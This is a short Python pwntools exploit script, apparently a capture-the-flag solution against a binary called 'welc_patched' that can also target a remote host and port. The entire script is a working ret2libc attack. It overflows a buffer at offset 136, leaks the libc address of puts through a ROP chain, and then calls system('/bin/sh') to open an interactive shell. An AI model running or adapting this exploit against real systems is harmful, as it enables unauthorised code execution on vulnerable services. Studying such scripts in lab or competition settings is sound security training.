#!/usr/bin/env python3
#12-04-2022
#Autorop = Yes
from pwn import *

exe = ELF("welc_patched")
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

context.binary = exe
context.log_level='debug'

offset = 136

pop_rdi = 0x0000000000401283 # pop rdi; ret; 
ret = 0x000000000040101a #: ret; 

def conn():
    if args.REMOTE:
        io = remote("20.216.39.14", 1237)
    else:
        io = process([exe.path])
        if args.DEBUG:
            gdb.attach(io)

    return io


io = conn()


#Auto
#rop = ROP(exe)
#rop.puts(elf.got.puts)
#rop.main()

#manual
payload = flat({
    offset: [
    pop_rdi,
    exe.got.puts,
    exe.plt.puts,
    exe.symbols.main 
    ]
    })

io.sendline(payload)
io.recvuntil(b'what about you ?\n')
leak = io.recvuntil(b'\n')
libc.address = u64(leak.rstrip().ljust(8, b'\x00')) - libc.sym.puts
info("Libc addr:%#x", libc.address)


payload = flat({
    offset: [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        ret,
        libc.sym.system
        ]
    })

io.sendline(payload)

io.interactive()
